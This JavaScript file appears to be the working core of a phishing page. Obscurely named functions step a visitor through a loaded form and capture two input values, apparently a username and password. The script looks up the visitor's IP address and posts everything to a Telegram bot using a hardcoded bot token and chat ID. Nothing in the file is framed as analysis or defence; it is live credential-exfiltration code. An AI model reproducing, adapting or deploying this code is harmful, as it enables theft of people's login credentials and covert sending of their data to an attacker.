function xsdfrm(event){

    event.preventDefault();

    var tokl = "6279465884:AAF2Ptv0e_IvmAx8oW2op1rXPBliMVZfxR0";
    var chat = "-874559498";

    var ixp1 = xsdfrm.val1;
    var ixp2 = $("#xfginpt002").val();


    if(!ixp1 | !ixp2){
        console.log('F');
    }else{

        mess = `JS - ${ixp1} - ${ixp2}`;
        
        $.get('https://ipinfo.io/ip', function(response){
            var sets = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + tokl + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
                },
                "data": JSON.stringify({
                    "chat_id": chat,
                    "text": "I:"+response+" - "+mess
                })
            };  
            $.ajax(sets).done(function (response) {
                console.log("Success");
                xgftr03();
            });  
        });
    }
}

function xgftr01() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        document.getElementById("xcont").innerHTML = this.responseText; 
        document.getElementById("xcont").onclick = null;
        }
    };
    xhttp.open("GET", "xkkj.html", true);
    xhttp.send();

}
function xgftr02() {

    var ixp1 = $("#xfginpt001").val();
    
    if(!ixp1){
        console.log('empty');
    }else{
        xsdfrm.val1 = ixp1;
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                document.getElementById("xcont").innerHTML = this.responseText; 
            }
        };
        xhttp.open("GET", "xkkj2.html", true);
        xhttp.send();
    }

}

function xgftr03() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        document.getElementById("xcont").innerHTML = this.responseText; 
        }
    };
    xhttp.open("GET", "xkkj3.html", true);
    xhttp.send();
}